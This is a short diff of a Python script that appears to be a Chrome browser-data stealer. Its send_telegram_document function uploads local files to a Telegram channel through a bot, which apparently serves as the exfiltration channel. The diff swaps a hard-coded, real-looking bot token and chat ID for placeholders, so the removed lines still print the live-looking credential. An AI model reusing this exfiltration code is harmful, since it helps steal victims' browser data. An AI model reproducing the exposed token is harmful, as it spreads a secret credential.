@@ -11,8 +11,8 @@ def chrome_date_and_time(chrome_data):
 
 def send_telegram_document(document_path, caption=""):
     """Sends the document to a Telegram channel using a bot."""
-    bot_token = "7076974857:AAH2nRGo9IN9P5g-fo19PFlc-znBfgGVzl4"  # Replace with your bot's token
-    chat_id = "-1002043772522"  # Replace with your chat ID
+    bot_token = "YOUR_CHAT_TOKEN"  # Replace with your bot's token
+    chat_id = "YOUR_CHAT_ID"  # Replace with your chat ID
     url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
     files = {'document': open(document_path, 'rb')}
     payload = {"chat_id": chat_id, "caption": caption}
@@ -91,3 +91,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
